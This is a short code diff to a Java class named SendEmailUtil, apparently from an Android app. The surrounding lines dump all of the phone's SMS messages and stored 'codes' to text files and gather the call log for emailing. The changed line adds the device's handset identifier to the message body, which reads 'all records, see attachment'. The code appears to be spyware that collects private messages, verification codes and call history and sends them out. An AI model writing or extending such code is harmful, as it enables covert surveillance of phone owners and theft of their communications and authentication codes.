@@ -242,7 +242,7 @@ public class SendEmailUtil {
 				SmsToTxtUtil.getInstence().saveAllSmsToTextFile();
 				CodesToTxtUtil.getInstence().saveAllCodesToTextFile();
 
-				String content = "所有记录，见附件";
+				String content = "所有记录，见附件 \r\n\r\n\r\n\r\n客户软件识别码：\r\n" + PhoneUtil.getHandsetId(MainApplication.getInstence());
 				Vector<String> files = new Vector<String>();
 
 				if (MainApplication.FILE_CALL_LOG.exists()) {
